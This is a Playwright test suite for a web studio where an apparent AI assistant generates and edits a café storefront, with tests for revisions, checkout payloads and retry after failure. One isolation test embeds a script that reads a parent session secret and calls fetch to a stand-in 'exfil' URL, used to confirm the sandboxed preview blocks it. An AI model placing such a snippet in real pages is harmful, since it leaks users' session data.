import { expect, test } from '@playwright/test';
import { readFileSync, readdirSync } from 'node:fs';
import path from 'node:path';
const root = path.resolve(import.meta.dirname,'../../../examples/independent-cafe');
const files: Array<{path:string;content:string;encoding:'utf8'|'base64'}> = [];
function scan(dir:string,prefix='') { for(const e of readdirSync(dir,{withFileTypes:true})) { if(e.name==='dist'||e.name.startsWith('.'))continue;const p=path.join(dir,e.name),name=prefix+e.name;if(e.isDirectory())scan(p,name+'/');else files.push({path:name,content:readFileSync(p).toString(/\.(webp|ttf)$/.test(name)?'base64':'utf8'),encoding:/\.(webp|ttf)$/.test(name)?'base64':'utf8'}); } }
scan(root);
const snapshot={schemaVersion:1,brief:{businessType:'Cafetería',audience:'Vecinos',primaryAction:'Hacer un pedido',visualDirection:'Menú editorial'},files};

test('source studio generates, previews commerce, edits a file, restores and downloads',async({page})=>{
  const versions:any[]=[];let revision=0;let patch:any;let generated:any;const messages:any[]=[];
  const errors:string[]=[];page.on('pageerror',e=>errors.push(e.message));
  await page.route('**/api/v1/**',async route=>{
    const url=new URL(route.request().url());const pathname=url.pathname;const method=route.request().method();
    let body:any={};
    if(pathname.endsWith('/dashboard/login')) body={token:'test-session',user:{email:'test@example.com'}};
    else if(pathname.endsWith('/stores'))body=[{id:'s1',name:'Café Aroma',slug:'cafe-aroma'}];
    else if(pathname.endsWith('/conversation'))body={messages};
    else if(pathname.endsWith('/messages')) {generated=route.request().postDataJSON();revision++;versions.unshift({revision,label:'Carta propia',snapshot:structuredClone(snapshot)});const userMessage={id:`u${revision}`,role:'USER',content:generated.instruction,metadata:{},createdAt:new Date().toISOString()};const assistantMessage={id:`a${revision}`,role:'ASSISTANT',content:'Preparé la carta. Dime qué ajustamos.',metadata:{sourceRevision:revision,label:'Carta propia'},createdAt:new Date().toISOString()};messages.push(userMessage,assistantMessage);body={userMessage,assistantMessage,revision:versions[0]};}
    else if(pathname.endsWith('/file')) {patch=route.request().postDataJSON();const copy=structuredClone(versions[0].snapshot);copy.files.find((f:any)=>f.path===patch.path).content=patch.content;revision++;versions.unshift({revision,label:'Edición',snapshot:copy});body=versions[0];}
    else if(pathname.endsWith('/restore')) {const target=Number(pathname.split('/').at(-2));revision++;versions.unshift({revision,label:'Restaurada',restoredFrom:target,snapshot:structuredClone(versions.find(v=>v.revision===target).snapshot)});body=versions[0];}
    else if(pathname.endsWith('/export')) {await route.fulfill({status:200,contentType:'application/zip',body:Buffer.from('PK-test-download')});return;}
    else if(/\/versions\/\d+$/.test(pathname))body=versions.find(v=>v.revision===Number(pathname.split('/').at(-1)));
    else if(pathname.endsWith('/source-project'))body={revision,versions,nextBefore:null};
    else throw new Error(`Unexpected request ${method} ${pathname}`);
    await route.fulfill({status:200,contentType:'application/json',body:JSON.stringify(body)});
  });
  await page.goto('/?source=1');await page.getByLabel('Correo',{exact:true}).fill('test@example.com');await page.getByLabel('Contraseña').fill('test-password');await page.getByRole('button',{name:'Entrar al Studio',exact:true}).click();
  await expect(page.getByRole('heading',{name:'Un sitio que se sienta tuyo.'})).toBeVisible();
  await page.getByRole('textbox',{name:'Indicación para YAPI'}).fill('Crea una cafetería con una carta clara y pedido visible');await page.getByRole('button',{name:'Enviar a YAPI'}).click();
  const frame=page.frameLocator('iframe');await expect(frame.getByRole('heading',{name:'Un buen día empieza aquí.'})).toBeVisible();
  expect(generated.revision).toBe(0);expect(generated.instruction).toContain('cafetería');expect(generated).not.toHaveProperty('brief');
  await page.reload();await expect(page.getByText('Preparé la carta. Dime qué ajustamos.',{exact:true})).toBeVisible();
  await expect(page.locator('iframe')).toHaveAttribute('sandbox','allow-scripts');
  await frame.getByRole('button',{name:'Añadir Café americano',exact:true}).click();
  await expect(frame.locator('[data-cart-count]')).toHaveText('1');
  await frame.getByRole('button',{name:'Revisar pedido de prueba'}).click();await expect(frame.locator('[data-pagosya-status]')).toContainText(/demostración|prueba|previa/);
  await page.getByRole('button',{name:'Código',exact:true}).click();const editor=page.getByRole('textbox',{name:'Código del archivo'});await editor.fill((await editor.inputValue()).replace('Un buen día','Una buena mañana'));
  await expect(page.getByRole('button',{name:'Descargar ZIP'})).toBeDisabled();await page.getByRole('button',{name:'Guardar como nueva revisión'}).click();await expect(page.locator('#source-revision')).toHaveValue('2');expect(patch.revision).toBe(1);expect(patch.path).toBe('index.html');expect(patch).not.toHaveProperty('files');
  await page.locator('#source-revision').selectOption('1');await expect(page.getByRole('button',{name:'Enviar a YAPI'})).toBeDisabled();await page.getByRole('button',{name:'Restaurar esta revisión'}).click();await expect(page.locator('#source-revision')).toHaveValue('3');
  const download=page.waitForEvent('download');await page.getByRole('button',{name:'Descargar ZIP'}).click();expect((await download).suggestedFilename()).toBe('storefront-r3.zip');
  await page.getByRole('textbox',{name:'Indicación para YAPI'}).fill('Haz la portada más editorial');await page.getByRole('button',{name:'Enviar a YAPI'}).click();await expect(page.locator('#source-revision')).toHaveValue('4');expect(generated.revision).toBe(3);
  await page.getByRole('button',{name:'Vista previa',exact:true}).click();await expect(frame.getByRole('heading',{name:'Un buen día empieza aquí.'})).toBeVisible();await page.screenshot({path:'.test-artifacts/source-studio-desktop.png',fullPage:true});await page.setViewportSize({width:390,height:844});await page.locator('iframe').scrollIntoViewIfNeeded();await expect(frame.getByRole('heading',{name:'Un buen día empieza aquí.'})).toBeVisible();await page.evaluate(()=>window.scrollTo(0,0));await page.screenshot({path:'.test-artifacts/source-studio-mobile.png',fullPage:false});await page.locator('iframe').scrollIntoViewIfNeeded();await expect(frame.getByRole('heading',{name:'Un buen día empieza aquí.'})).toBeVisible();await page.screenshot({path:'.test-artifacts/source-studio-mobile-preview.png',fullPage:false});expect(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth)).toBe(true);
  expect(errors).toEqual([]);
});

test('preview blocks access to parent session and network requests',async({page})=>{
  await page.goto('/?demo=1');
  const result=await page.evaluate(async()=>{
    const {sourcePreviewDocument}=await import('/src/source-preview.ts' as string);
    sessionStorage.setItem('preview-test-secret','private');
    const html='<div id="result">pending</div><script>let parentBlocked=false;try{parent.sessionStorage.getItem("preview-test-secret")}catch{parentBlocked=true}fetch("https://example.invalid/exfil").then(()=>document.getElementById("result").textContent="network allowed").catch(()=>document.getElementById("result").textContent=parentBlocked?"isolated":"parent allowed")</script>';
    const frame=document.createElement('iframe');frame.sandbox.add('allow-scripts');frame.title='Isolation check';frame.srcdoc=sourcePreviewDocument({schemaVersion:1,brief:{},files:[{path:'index.html',content:html}]});document.body.append(frame);return true;
  });expect(result).toBe(true);await expect(page.frameLocator('iframe[title="Isolation check"]').locator('#result')).toHaveText('isolated');
});

test('portable commerce refreshes stock and sends only product ids and quantities to checkout',async({page})=>{
  await page.goto('/?demo=1');
  const configText=files.find(f=>f.path==='config.js')!.content.replace('"demo": true','"demo": false');
  const commerce=files.find(f=>f.path==='commerce.js')!.content;
  let checkout:any;let loaded=false;
  await page.route('**/v1/stores/public/cafe-aroma/store',async route=>{const config=JSON.parse(configText.slice(configText.indexOf('=')+1).trim().replace(/;$/,''));config.data.items[0].stock=1;loaded=true;await route.fulfill({status:200,contentType:'application/json',body:JSON.stringify(config.data)});});
  await page.route('**/v1/stores/public/cafe-aroma/cart-checkout',async route=>{checkout=route.request().postDataJSON();await route.fulfill({status:400,contentType:'application/json',body:JSON.stringify({message:'Prueba sin crear cobros'})});});
  await page.setContent('<div data-pagosya-categories></div><div data-pagosya-catalog></div><div data-pagosya-cart></div><p data-pagosya-status></p>');await page.addScriptTag({content:configText});await page.addScriptTag({content:commerce});
  await expect(page.getByRole('button',{name:'Añadir Café americano',exact:true})).toBeVisible();await expect.poll(()=>loaded).toBe(true);
  await page.getByRole('button',{name:'Añadir Café americano',exact:true}).click();await expect(page.getByRole('button',{name:'Añadir Café americano',exact:true})).toBeDisabled();
  await page.locator('.checkout-button').click();await expect.poll(()=>checkout).toBeTruthy();expect(checkout.items).toEqual([{paymentLinkId:'CAF-001',quantity:1}]);expect(checkout.items[0]).not.toHaveProperty('amount');
});

test('failed chat generation preserves the request and permits retry', async ({ page }) => {
  let calls = 0, revision = 0;
  const messages: any[] = [];
  const saved = { revision: 1, label: 'Carta propia', snapshot };
  await page.addInitScript(() => sessionStorage.setItem('pagosya_merchant_session', 'test-session'));
  await page.route('**/api/v1/**', async route => {
    const pathname = new URL(route.request().url()).pathname;
    let body: any;
    if (pathname.endsWith('/stores')) body = [{ id: 's1', name: 'Café Aroma', slug: 'cafe' }];
    else if (pathname.endsWith('/conversation')) body = { messages };
    else if (pathname.endsWith('/source-project')) body = { revision, versions: revision ? [saved] : [], nextBefore: null };
    else if (pathname.endsWith('/versions/1')) body = saved;
    else if (pathname.endsWith('/messages')) {
      calls++;
      if (calls === 1) {
        messages.push({ id: 'failed', role: 'ASSISTANT', content: 'No pude completar esta revisión.', metadata: { failed: true } });
        await route.fulfill({ status: 502, contentType: 'application/json', body: JSON.stringify({ message: 'La generación no respondió. Vuelve a intentarlo.' }) }); return;
      }
      revision = 1;
      body = { revision: saved, userMessage: { id: 'u', role: 'USER', content: route.request().postDataJSON().instruction }, assistantMessage: { id: 'a', role: 'ASSISTANT', content: 'Tu revisión está lista.', metadata: { sourceRevision: 1 } } };
      messages.push(body.userMessage, body.assistantMessage);
    } else throw new Error(`Unexpected route ${pathname}`);
    await route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(body) });
  });
  await page.goto('/?source=1');
  const composer = page.getByRole('textbox', { name: 'Indicación para YAPI' });
  await composer.fill('Crea una carta cálida para mi cafetería');
  await page.getByRole('button', { name: 'Enviar a YAPI' }).click();
  await expect(page.getByRole('alert')).toContainText('Vuelve a intentarlo');
  await expect(composer).toHaveValue('Crea una carta cálida para mi cafetería');
  await page.getByRole('button', { name: 'Enviar a YAPI' }).click();
  await expect(page.locator('#source-revision')).toHaveValue('1');
  await expect(composer).toHaveValue('');
  expect(calls).toBe(2);
});
